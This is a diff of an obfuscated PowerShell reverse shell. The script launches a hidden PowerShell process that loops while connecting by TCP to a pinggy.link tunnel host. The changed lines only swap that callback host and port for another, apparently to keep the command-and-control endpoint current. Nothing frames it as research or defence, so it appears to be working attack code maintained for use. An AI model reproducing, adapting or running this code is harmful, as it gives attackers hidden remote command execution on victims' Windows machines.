@@ -1,7 +1,7 @@
 Start-Process $PSHOME\powershell.exe -ArgumentList {
   while ($true) {
     try {
-      $a1b2c3d4e5f6g7h8i9j0 = New-Object Net.Sockets.TCPClient('stfsw-39-43-163-182.a.free.pinggy.link', 37131);
+      $a1b2c3d4e5f6g7h8i9j0 = New-Object Net.Sockets.TCPClient('ovask-39-58-142-211.a.free.pinggy.link', 35207);
       $k1l2m3n4o5p6q7r8s9t0 = $a1b2c3d4e5f6g7h8i9j0.GetStream();
       $u1v2w3x4y5z6a7b8c9d0 = New-Object IO.StreamWriter($k1l2m3n4o5p6q7r8s9t0);
       [byte[]]$e1f2g3h4i5j6k7l8m9n0 = 0..$a1b2c3d4e5f6g7h8i9j0.ReceiveBufferSize | % {0};
@@ -32,6 +32,7 @@ Start-Process $PSHOME\powershell.exe -ArgumentList {
     }
   }
 } -WindowStyle Hidden
+
 
 
 
